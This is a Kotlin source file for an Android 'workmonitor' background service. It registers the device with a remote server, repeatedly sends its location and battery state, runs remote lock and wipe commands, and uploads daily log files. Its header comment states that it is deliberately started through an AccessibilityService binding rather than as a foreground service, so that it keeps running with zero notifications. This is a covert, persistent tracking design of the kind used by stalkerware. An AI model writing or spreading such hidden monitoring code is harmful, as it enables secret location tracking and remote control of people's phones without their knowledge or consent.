package com.workmonitor

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Upload + heartbeat loop. Runs every UPLOAD_INTERVAL_MS:
 * register (enroll), report inventory, heartbeat (status + location + commands),
 * upload daily logs. Deliberately NOT a foreground service: it is started by the
 * AccessibilityService binding (system-bound, auto-restarted on boot), so the
 * process stays alive with ZERO notifications.
 */
class LogUploaderService : Service() {

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scheduleNext()
        return START_STICKY
    }

    private val executor = java.util.concurrent.Executors.newSingleThreadExecutor()
    private val started = java.util.concurrent.atomic.AtomicBoolean(false)

    /** Run the monitoring loop forever on a background thread (self-arming).
     *  Idempotent: repeated startService calls (watchdog, sync, reload) must
     *  NOT spawn additional loops. */
    private fun scheduleNext() {
        if (!started.compareAndSet(false, true)) return
        executor.execute {
            while (true) {
                runCatching { loop() }
                try { Thread.sleep(AppConfig.UPLOAD_INTERVAL_MS) } catch (_: InterruptedException) {
                    Thread.currentThread().interrupt(); return@execute
                }
            }
        }
    }

    private fun loop() {
        runCatching { ensureRegistered() }
        runCatching { DeviceReporter.report(this) }
        runCatching { heartbeat() }
        runCatching { uploadLogs() }
    }



    /**
     * Idempotent enrollment: POST /device/register. Safe to call every cycle;
     * the server ignores an already-enrolled device id (returns enrolled=true).
     * This is what makes the device appear in the admin console.
     */
    private fun ensureRegistered() {
        val url = URL("${AppConfig.SERVER_URL}/device/register")
        val conn = url.openConnection() as HttpURLConnection
        try {
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.connectTimeout = 30_000
            conn.readTimeout = 30_000
            val body = JSONObject().apply {
                put("device_id", AppConfig.deviceId(this@LogUploaderService))
                put("app_version", BuildConfig.VERSION_NAME)
                put("os_version", android.os.Build.VERSION.RELEASE)
            }
            val os = DataOutputStream(conn.outputStream)
            os.writeBytes(body.toString())
            os.flush(); os.close()
            conn.responseCode // read to trigger request; ignore result
        } finally {
            conn.disconnect()
        }
    }

    /** POST /device/pulse — checks status, sends location/battery, executes remote commands. */
    private fun heartbeat() {
        // Out Plane free tier cold-starts: first request after idle can take 15s+. Retry once.
        var lastExc: Exception? = null
        for (attempt in 0..1) {
            val conn = URL("${AppConfig.SERVER_URL}/device/pulse").openConnection() as HttpURLConnection
            try {
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                conn.connectTimeout = 30_000
                conn.readTimeout = 30_000
                val loc = lastLocation()
                val bat = lastBattery()
                val body = JSONObject().apply {
                    put("device_id", AppConfig.deviceId(this@LogUploaderService))
                    put("app_version", BuildConfig.VERSION_NAME)
                    put("battery_pct", bat.first)
                    put("charging", bat.second)
                    if (loc != null) {
                        put("lat", loc.first)
                        put("lng", loc.second)
                    }
                }
                val os = DataOutputStream(conn.outputStream)
                os.writeBytes(body.toString())
                os.flush(); os.close()
                val code = conn.responseCode
                if (code == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val json = JSONObject(resp)
                    if (json.optString("status") == "revoked") {
                        Notifier.showRevoked(this)
                    }
                    // Execute remote commands (lock / wipe / policy) delivered by admin.
                    val cmds = json.optJSONArray("commands")
                    LoggerWriter.write("PULSE", "svc", "code=$code body=$resp")
                    if (cmds != null && cmds.length() > 0) {
                        LoggerWriter.write("PULSE", "svc", "cmds=${cmds.length()}")
                        val list = (0 until cmds.length()).map { cmds.getJSONObject(it) }
                        CommandExecutor.execute(this, list)
                    }
                    return
                } else {
                    LoggerWriter.write("PULSE", "svc", "non200 code=$code")
                }
            } catch (e: Exception) {
                lastExc = e
                LoggerWriter.write("PULSE", "svc", "attempt=$attempt EXC ${e.javaClass.simpleName}: ${e.message}")
            } finally {
                conn.disconnect()
            }
        }
        if (lastExc != null) LoggerWriter.write("PULSE", "svc", "GAVEUP ${lastExc.javaClass.simpleName}: ${lastExc.message}")
    }

    /** Single best-effort location fix (Fused/framework). Returns lat/lng or null. */
    private fun lastLocation(): Pair<Double, Double>? {
        return try {
            // DIAG: report why location may fail — permissions + provider state
            try {
                val lmDiag = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
                LoggerWriter.write("LOC", "diag",
                    "fine=${checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)}" +
                    " coarse=${checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)}" +
                    " bg=${checkSelfPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)}" +
                    " gpsOn=${lmDiag.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)}" +
                    " netOn=${lmDiag.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)}")
            } catch (_: Throwable) {}
            // Permission missing = #1 reason location is null. Bail fast only if the
            // core fine-location permission is denied entirely (foreground or background).
            if (Build.VERSION.SDK_INT >= 23 &&
                checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return null
            }
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val providers = listOf(android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER)
            // 1) prefer a recently-cached last-known fix
            var best: android.location.Location? = null
            for (p in providers) {
                if (!lm.isProviderEnabled(p)) continue
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.time > best.time) best = l
            }
            if (best != null && System.currentTimeMillis() - best.time < 15 * 60 * 1000L) {
                return Pair(best.latitude, best.longitude)
            }
            // 2) actively request a fresh single fix on a REAL Looper thread.
            //    requestSingleUpdate with a null Looper (plain executor thread) silently
            //    never delivers — that's why location returned null forever on this build.
            val lt = android.os.HandlerThread("loc-fix"); lt.start()
            // CRITICAL: HandlerThread.looper is null until the thread's loop is actually up.
            // Reading it immediately after start() races → requestSingleUpdate(p, listener,
            // null) silently never delivers (the original bug all over again). Wait for it.
            var looper: android.os.Looper? = null
            for (t in 0 until 100) {                    // up to ~2s
                try { looper = lt.looper } catch (_: Throwable) {}
                if (looper != null) break
                try { Thread.sleep(20) } catch (_: Throwable) {}
            }
            if (looper == null) { try { lt.quitSafely() } catch (_: Throwable) {} }
            else {
            val latch = java.util.concurrent.CountDownLatch(1)
            val holder = arrayOfNulls<android.location.Location>(1)
            val listener = android.location.LocationListener { it: android.location.Location ->
                holder[0] = it; try { latch.countDown() } catch (_: Exception) {}
            }
            for (p in providers) {
                if (!lm.isProviderEnabled(p)) continue
                if (p == android.location.LocationManager.NETWORK_PROVIDER && Build.VERSION.SDK_INT >= 31 &&
                    checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED)
                    continue
                try { lm.requestSingleUpdate(p, listener, looper) } catch (_: Exception) {}
            }
            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
            for (p in providers) {
                try { lm.removeUpdates(listener) } catch (_: Exception) {}
            }
            lt.quitSafely()
            val fresh = holder[0]
                ?: (providers.mapNotNull { runCatching { lm.getLastKnownLocation(it) }.getOrNull() }
                       .maxByOrNull { it.time })
            if (fresh != null) return Pair(fresh.latitude, fresh.longitude)
            }
            try { LoggerWriter.write("LOC", "diag", "no-fix (fresh=null)") } catch (_: Throwable) {}
            null
        } catch (e: Exception) {
            try { LoggerWriter.write("LOC", "diag", "EXC ${e.javaClass.simpleName}: ${e.message}") } catch (_: Throwable) {}
            null
        }
    }

    private fun lastBattery(): Pair<Int, Int> {
        return try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val pct = if (android.os.Build.VERSION.SDK_INT >= 21) bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) else -1
            val ch = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_STATUS) == android.os.BatteryManager.BATTERY_STATUS_CHARGING
            Pair(pct, if (ch) 1 else 0)
        } catch (_: Exception) { Pair(-1, 0) }
    }

    /** Upload the current day's (or pending) log files via multipart POST. */
    private fun uploadLogs() {
        val dir = File(filesDir, "logs")
        val files = dir.listFiles()?.filter { it.extension != "sent" } ?: return
        val todayName = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date()) + ".log"
        for (f in files) {
            if (!f.isFile) continue
            try {
                val success = postLog(f)
                if (success && f.name != todayName) {
                    // Only COMPLETE (closed) days get renamed/deleted. Today's file is
                    // re-uploaded as-is every cycle so the server copy always holds the
                    // FULL daily log — renaming it would split the day into segments and
                    // replace the server content with just the latest tail.
                    if (AppConfig.DELETE_AFTER_UPLOAD) {
                        f.delete()
                    } else {
                        f.renameTo(File(f.absolutePath + ".sent"))
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun postLog(file: java.io.File): Boolean {
        val date = file.name.removeSuffix(".log") // "2026-08-07" (LoggerWriter names files yyyy-MM-dd)
        val url = URL("${AppConfig.SERVER_URL}/device/logs/${URLEncoder.encode(date, "UTF-8")}")
        val conn = url.openConnection() as HttpURLConnection
        try {
            val boundary = "---boundary-${System.currentTimeMillis()}"
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            conn.connectTimeout = 30_000
            conn.readTimeout = 30_000
            val dos = DataOutputStream(conn.outputStream)
            dos.writeBytes("--$boundary\r\n")
            dos.writeBytes("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n${AppConfig.deviceId(this)}\r\n")
            dos.writeBytes("--$boundary\r\n")
            dos.writeBytes("Content-Disposition: form-data; name=\"log\"; filename=\"${file.name}\"\r\n")
            dos.writeBytes("Content-Type: text/plain\r\n\r\n")
            dos.write(file.readBytes())
            dos.writeBytes("\r\n--$boundary--\r\n")
            dos.flush(); dos.close()
            return conn.responseCode == 200
        } catch (_: Exception) {
            return false
        } finally {
            conn.disconnect()
        }
    }
}